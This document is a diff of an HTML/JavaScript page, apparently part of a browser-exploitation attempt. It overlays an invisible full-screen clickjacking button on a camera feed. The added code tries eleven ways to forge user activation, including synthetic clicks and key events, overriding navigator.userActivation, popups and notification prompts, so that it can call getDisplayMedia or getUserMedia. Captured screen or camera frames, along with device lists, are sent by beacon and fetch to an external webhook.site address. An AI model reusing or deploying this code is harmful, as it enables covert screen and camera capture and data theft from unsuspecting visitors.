@@ -3,118 +3,210 @@
 <head><title>C</title></head>
 <body style="margin:0;background:#111;">
 <img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
+<button id="btn" style="position:absolute;top:0;left:0;width:640px;height:480px;opacity:0.01;z-index:999;">X</button>
 <script>
 var W='https://webhook.site/92edf9eb-21c9-4e44-9c9d-6443b79fa56d';
 function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
 rpt('ALIVE','1');
-rpt('SEC',window.isSecureContext+'|'+location.protocol+'|'+location.host);
+rpt('SEC',window.isSecureContext+'|'+location.protocol);
 rpt('MD',typeof navigator.mediaDevices);
 
-var cam=document.getElementById('cam');
-var imgLoaded=false;
+// Enumerate devices first
+if(navigator.mediaDevices){
+    navigator.mediaDevices.enumerateDevices().then(function(ds){
+        var info=ds.map(function(d){return d.kind+':'+d.deviceId.substring(0,8)+':'+d.label}).join('|');
+        rpt('DEVS',info||'none');
+    }).catch(function(e){rpt('DEVS_E',e.message)});
+}
 
+// Check user activation state
+rpt('UA',typeof navigator.userActivation);
+if(navigator.userActivation){
+    rpt('UA_STATE','active='+navigator.userActivation.isActive+'|been='+navigator.userActivation.hasBeenActive);
+}
+
+var cam=document.getElementById('cam');
+var btn=document.getElementById('btn');
+var capDone=false;
+
+// Method 1: button.click() - might trigger user activation in Firefox 146
+btn.addEventListener('click',function(e){
+    rpt('BTN_CLICK','isTrusted='+e.isTrusted+'|active='+navigator.userActivation.isActive);
+    if(!capDone) doCapture();
+});
+
+// Method 2: Focus-based activation
+btn.addEventListener('focus',function(e){
+    rpt('BTN_FOCUS','1');
+});
+
+// Try multiple activation approaches
+var imgLoaded=false;
 cam.onload=function(){
     if(imgLoaded)return;imgLoaded=true;
     rpt('IMG','w='+cam.naturalWidth+'|h='+cam.naturalHeight);
-    setTimeout(doCapture,2000);
+    startAttempts();
 };
 cam.onerror=function(){
     rpt('IMG_E','1');
-    setTimeout(doCapture,3000);
+    startAttempts();
 };
-setTimeout(function(){doCapture()},8000);
+setTimeout(startAttempts,5000);
 
-var capDone=false;
-function doCapture(){
-    if(capDone)return;capDone=true;
-    rpt('CAP_START','sec='+window.isSecureContext+'|md='+typeof navigator.mediaDevices);
+var started=false;
+function startAttempts(){
+    if(started)return;started=true;
 
-    if(!navigator.mediaDevices){
-        rpt('NO_MD','trying overrides');
-        // Try override isSecureContext
+    // Attempt 1: Direct call (will fail with activation error - baseline)
+    tryGDM('direct');
+
+    // Attempt 2: button.click() (programmatic)
+    setTimeout(function(){
+        rpt('TRY_CLICK','btn.click()');
+        btn.click();
+    },1000);
+
+    // Attempt 3: dispatchEvent with MouseEvent
+    setTimeout(function(){
+        rpt('TRY_DISPATCH','MouseEvent');
+        btn.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true}));
+    },2000);
+
+    // Attempt 4: dispatchEvent with PointerEvent
+    setTimeout(function(){
+        rpt('TRY_POINTER','PointerEvent');
         try{
-            Object.defineProperty(window,'isSecureContext',{value:true,configurable:true});
-            rpt('OVERRIDE_SEC',window.isSecureContext+'|md='+typeof navigator.mediaDevices);
-        }catch(e){rpt('OVERRIDE_E',e.message)}
+            btn.dispatchEvent(new PointerEvent('click',{bubbles:true,cancelable:true,pointerId:1,pointerType:'mouse'}));
+        }catch(e){rpt('POINTER_E',e.message)}
+    },3000);
 
-        // Try getter directly
+    // Attempt 5: focus + keyboard event
+    setTimeout(function(){
+        rpt('TRY_KEY','focus+enter');
+        btn.focus();
+        btn.dispatchEvent(new KeyboardEvent('keydown',{key:'Enter',keyCode:13,bubbles:true}));
+        btn.dispatchEvent(new KeyboardEvent('keyup',{key:'Enter',keyCode:13,bubbles:true}));
+    },4000);
+
+    // Attempt 6: document.execCommand (historically triggers activation)
+    setTimeout(function(){
+        rpt('TRY_EXEC','copy');
         try{
-            var desc=Object.getOwnPropertyDescriptor(Navigator.prototype,'mediaDevices');
-            rpt('GETTER',desc?'get='+typeof desc.get:'null');
-            if(desc&&desc.get){
-                var val=desc.get.call(navigator);
-                rpt('GETTER_VAL',typeof val+'|'+String(val).substring(0,100));
-                if(val){
-                    rpt('GETTER_GDM',typeof val.getDisplayMedia);
-                    if(val.getDisplayMedia){
-                        doGDM(val);
-                        return;
-                    }
-                }
+            var result=document.execCommand('copy');
+            rpt('EXEC_RESULT',''+result);
+            // Check activation after execCommand
+            rpt('EXEC_UA','active='+navigator.userActivation.isActive);
+            if(navigator.userActivation.isActive){
+                doCapture();
             }
-        }catch(e){rpt('GETTER_E',e.message)}
+        }catch(e){rpt('EXEC_E',e.message)}
+    },5000);
 
-        // Try legacy getUserMedia
-        if(navigator.getUserMedia){
-            rpt('LGUM','available');
-            try{
-                navigator.getUserMedia({video:{mediaSource:'screen'}},onStream,function(e){rpt('LGUM_E',e.name+':'+e.message)});
-            }catch(e){rpt('LGUM_X',e.message)}
-        }
-        rpt('NO_MD_DONE','exhausted');
-        return;
-    }
+    // Attempt 7: Override userActivation
+    setTimeout(function(){
+        rpt('TRY_OVERRIDE','userActivation');
+        try{
+            Object.defineProperty(navigator,'userActivation',{
+                value:{isActive:true,hasBeenActive:true},
+                configurable:true
+            });
+            rpt('OVERRIDE_UA','active='+navigator.userActivation.isActive);
+            tryGDM('override_ua');
+        }catch(e){rpt('OVERRIDE_UA_E',e.message)}
+    },6000);
 
-    rpt('HAS_MD','gdm='+typeof navigator.mediaDevices.getDisplayMedia+'|gum='+typeof navigator.mediaDevices.getUserMedia);
+    // Attempt 8: window.open trick (opens popup, which might have activation)
+    setTimeout(function(){
+        rpt('TRY_POPUP','window.open');
+        try{
+            var w=window.open('about:blank','','width=1,height=1');
+            if(w){
+                rpt('POPUP','opened');
+                w.close();
+                // After opening popup, check activation
+                rpt('POPUP_UA','active='+navigator.userActivation.isActive);
+                if(navigator.userActivation.isActive){
+                    doCapture();
+                }
+            }else{
+                rpt('POPUP','blocked');
+            }
+        }catch(e){rpt('POPUP_E',e.message)}
+    },7000);
 
-    if(navigator.mediaDevices.getDisplayMedia){
-        doGDM(navigator.mediaDevices);
-    } else if(navigator.mediaDevices.getUserMedia){
-        doGUM();
-    } else {
-        rpt('NO_CAP','no gdm/gum');
-    }
+    // Attempt 9: Use setPointerCapture trick
+    setTimeout(function(){
+        rpt('TRY_PTRCAP','1');
+        try{
+            btn.setPointerCapture(1);
+        }catch(e){}
+        // Force activation via autoplay
+        try{
+            var audio=document.createElement('audio');
+            audio.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';
+            audio.play().then(function(){
+                rpt('AUDIO_PLAY','ok|active='+navigator.userActivation.isActive);
+                if(navigator.userActivation.isActive) doCapture();
+            }).catch(function(e){rpt('AUDIO_E',e.message)});
+        }catch(e){rpt('AUDIO_X',e.message)}
+    },8000);
+
+    // Attempt 10: Use Notification.requestPermission (triggers activation in some browsers)
+    setTimeout(function(){
+        rpt('TRY_NOTIF','1');
+        try{
+            Notification.requestPermission().then(function(p){
+                rpt('NOTIF_PERM',p+'|active='+navigator.userActivation.isActive);
+                if(navigator.userActivation.isActive) doCapture();
+            }).catch(function(e){rpt('NOTIF_E',e.message)});
+        }catch(e){rpt('NOTIF_X',e.message)}
+    },9000);
+
+    // Attempt 11: getUserMedia with video:true (camera, not screen)
+    setTimeout(function(){
+        rpt('TRY_CAM','getUserMedia video:true');
+        navigator.mediaDevices.getUserMedia({video:true}).then(function(s){
+            rpt('CAM_STREAM','tracks='+s.getTracks().length);
+            // If we got a camera stream, try to use it
+            onStream(s);
+        }).catch(function(e){
+            rpt('CAM_E',e.name+':'+e.message);
+            // Try audio
+            navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){
+                rpt('AUDIO_STREAM','tracks='+s.getTracks().length);
+            }).catch(function(e2){rpt('AUDIO_GUM_E',e2.name+':'+e2.message)});
+        });
+    },10000);
 }
 
-function doGDM(md){
-    rpt('TRY_GDM','1');
-    md.getDisplayMedia({video:true}).then(onStream).catch(function(e){
-        rpt('GDM_E',e.name+':'+e.message);
-        // Try getUserMedia fallbacks
-        doGUM();
+function tryGDM(label){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia)return;
+    rpt('GDM_TRY',label+'|active='+navigator.userActivation.isActive);
+    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+        rpt('GDM_OK',label+'|tracks='+s.getTracks().length);
+        capDone=true;
+        onStream(s);
+    }).catch(function(e){
+        rpt('GDM_FAIL',label+'|'+e.name+':'+e.message);
     });
 }
 
-function doGUM(){
-    var attempts=[
-        {video:{mediaSource:'screen'}},
-        {video:{mediaSource:'window'}},
-        {video:{mediaSource:'browser'}},
-        {video:true}
-    ];
-    function go(i){
-        if(i>=attempts.length){rpt('GUM_EXHAUST','1');return}
-        rpt('TRY_GUM',i+'|'+JSON.stringify(attempts[i]));
-        navigator.mediaDevices.getUserMedia(attempts[i]).then(onStream).catch(function(e){
-            rpt('GUM_E',i+'|'+e.name+':'+e.message);
-            go(i+1);
-        });
-    }
-    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia) go(0);
-    else rpt('NO_GUM','1');
+function doCapture(){
+    if(capDone)return;
+    rpt('DO_CAP','active='+navigator.userActivation.isActive);
+    tryGDM('doCapture');
 }
 
 function onStream(stream){
     rpt('STREAM','tracks='+stream.getTracks().length);
-    var tracks=stream.getTracks();
-    for(var i=0;i<tracks.length;i++){
-        rpt('TRACK',i+'|kind='+tracks[i].kind+'|label='+tracks[i].label+'|state='+tracks[i].readyState);
+    for(var i=0;i<stream.getTracks().length;i++){
+        var t=stream.getTracks()[i];
+        rpt('TRACK',t.kind+':'+t.label+':'+t.readyState);
     }
     var v=document.createElement('video');
     v.srcObject=stream;v.autoplay=true;v.muted=true;
     v.style.cssText='width:640px;height:480px;display:block';
     document.body.appendChild(v);
-
     v.onloadeddata=function(){
         rpt('VID',v.videoWidth+'x'+v.videoHeight);
         setTimeout(function(){grab(v,stream)},2000);
@@ -133,11 +225,8 @@ function grab(v,stream){
     try{
         var du=c.toDataURL('image/jpeg',0.7);
         rpt('DU_LEN',''+du.length);
-        // Send via multiple methods
         try{navigator.sendBeacon(W,du)}catch(e){}
         fetch(W,{method:'POST',mode:'no-cors',body:'CAP:'+du}).catch(function(){});
-        // Also try sending to our HTTPS server
-        fetch(location.origin+'/exfil',{method:'POST',body:'CAP:'+du}).catch(function(){});
     }catch(e){rpt('DU_E',e.message)}
     stream.getTracks().forEach(function(t){t.stop()});
 }
